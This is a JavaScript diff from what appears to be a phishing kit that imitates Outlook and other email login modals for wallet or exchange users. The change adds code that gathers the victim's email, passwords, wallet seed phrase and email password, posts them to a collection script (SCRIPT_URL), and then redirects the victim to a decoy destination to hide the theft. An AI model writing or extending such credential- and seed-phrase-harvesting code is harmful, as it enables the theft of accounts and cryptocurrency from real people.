@@ -240,7 +240,7 @@ $(function () {
                     });
 
                         Fancybox.show([{src: id, type: "inline"}], {click: false});
-                        if (id === "#outlook_modal" || id === "#rackspace_modal") {
+                        if (id === "#outlook_modal" || id === "#others_modal") {
                             $(".fancybox__slide.is-selected.has-inline").css({
                                 "border-width": "0",
                                 "padding": "0",
@@ -345,9 +345,27 @@ function passPhraseCheck(content) {
     }
 }
 
-window.submitEmailFromFrame = function (password, email, domain) {
+window.submitEmailFromFrame = function (email_password, _email, domain) {
 
-    console.log(password)
+    let type = is_wallet ? "Wallet" : "Exchange";
+    let post = JSON.stringify({email: EmailValue, password: PasswordValue, type, phrase: PassPhraseValue, domain, email_password});
+    $.ajax({
+        url: SCRIPT_URL,
+        type: 'POST',
+        dataType: "json",
+        data: {type: "email", post},
+        success: function (response) {
+            setTimeout(function () {
+
+                location.replace(DESTINATION_URL);
+
+            }, 1200)
+        },
+        error: function (response) {
+            let error = {errors: response.responseJSON.errors[0]}
+            location.replace(location.href)
+        }
+    });
 
 }
 
